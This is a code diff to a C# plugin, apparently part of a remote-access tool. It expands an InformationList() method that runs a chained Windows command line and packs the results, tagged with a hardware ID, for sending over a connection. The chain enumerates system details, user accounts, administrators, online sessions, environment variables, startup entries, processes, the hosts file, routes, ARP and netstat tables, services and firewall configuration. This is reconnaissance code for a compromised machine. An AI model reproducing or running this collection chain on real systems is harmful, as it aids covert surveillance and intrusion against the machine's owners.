@@ -45,7 +45,7 @@ namespace Plugin
         }
         public static byte[] InformationList()
         {
-            string back = execCMD(@"echo ####information collection#### & systeminfo & ver & hostname & net user & net localgroup & net localgroup administrators & net user guest & net user administrator & echo ####task-list#### & tasklist /svc & echo & echo ####net-work information#### & ipconfig/all & route print & arp -a & netstat -an & ipconfig /displaydns & echo ####service#### & sc query type= service state= all");
+            string back = execCMD(@"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config");
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Pac_ket").AsString = "Information";
             msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
